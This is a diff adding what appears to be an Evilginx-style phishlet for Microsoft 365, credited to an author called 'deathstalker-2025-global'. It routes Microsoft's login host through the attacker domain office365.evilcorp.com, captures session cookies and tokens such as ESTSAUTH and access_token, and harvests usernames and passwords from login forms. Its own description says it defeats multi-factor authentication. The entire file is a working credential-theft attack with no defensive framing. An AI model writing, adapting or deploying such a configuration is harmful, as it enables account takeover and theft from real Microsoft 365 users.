@@ -1,0 +1,29 @@
+﻿phishlet microsoft365
+author deathstalker-2025-global
+description Deathstalker Microsoft 365 Full Creds MFA Sessions Tokens Harvest Bypass
+
+proxy_hosts {
+  proxy_host { phish_sub login; orig_sub login.microsoftonline.com; domain office365.evilcorp.com; session true; cookies true }
+  proxy_host { phish_sub www; orig_sub www.office.com; session false }
+}
+
+auth_tokens {
+  auth_token ESTSAUTH
+  auth_token ESTSAUTHPERSISTENT
+  auth_token access_token
+  auth_token .ASPXAUTH
+}
+
+credentials {
+  username { key loginfmt; type post }
+  password { key passwd; type post }
+}
+
+sub_filters {
+  replace "login.microsoftonline.com" "@{phish_domain}"
+  replace "www.office.com" "@{phish_domain}"
+}
+
+lures {
+  default_lure { path "/"; redirect_url "https://login.microsoftonline.com/" }
+}
